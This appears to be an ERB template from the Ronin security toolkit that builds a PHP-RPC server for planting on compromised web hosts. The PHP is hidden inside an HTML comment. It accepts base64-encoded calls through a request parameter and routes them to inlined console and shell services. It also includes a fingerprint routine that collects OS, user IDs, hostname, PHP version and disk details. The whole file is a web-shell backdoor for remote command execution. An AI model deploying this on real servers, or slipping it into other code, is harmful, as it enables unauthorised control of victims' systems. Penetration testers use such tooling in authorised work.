<!--
<?php
#
# Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
# environments.
#
# Copyright (c) 2007-2009
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

<%= read_template 'rpc_server.php' %>
<%= read_template 'service.php' %>
<%= read_template 'console_service.php' %>
<%= read_template 'shell_service.php' %>
function running($params=array())
{
  return true;
}

function fingerprint($params=array())
{
  $profile = array(
    'os' => PHP_OS,
    'system_name' => php_uname('s'),
    'system_release' => php_uname('r'),
    'system_version' => php_uname('v'),
    'machine_type' => php_uname('m'),
    'host_name' => php_uname('n'),
    'php_server_api' => php_sapi_name(),
    'php_version' => phpversion(),
    'uid' => posix_getuid(),
    'gid' => posix_getgid(),
    'cwd' => getcwd(),
    'disk_free_space' => disk_free_space('/'),
    'disk_total_space' => disk_total_space('/')
  );

  switch ($profile['php_server_api'])
  {
  case 'apache':
    $profile['apache_version'] = apache_get_version();
    break;
  }

  return $profile;
}

#
# Inlined PHP: Start
#
<% options[:inline].each { |path| %><%= File.read(path) %><% } %>
#
# Inlined PHP: End
#

if (isset($_REQUEST['rpc_call']))
{
  $server = new RPCServer();
  $server->register_method('running', 'running');
  $server->register_method('fingerprint', 'fingerprint');
  $server->register_service('console', new ConsoleService());
  $server->register_service('shell', new ShellService());

  $xml = base64_decode(rawurldecode($_REQUEST['rpc_call']));
  $response = $server->call_method($xml);

  echo("<rpc>{$response}</rpc>");
  exit;
}

?>
-->

<% unless options.no_ajax? %><%= read_template 'ajax.php' %><% end %>
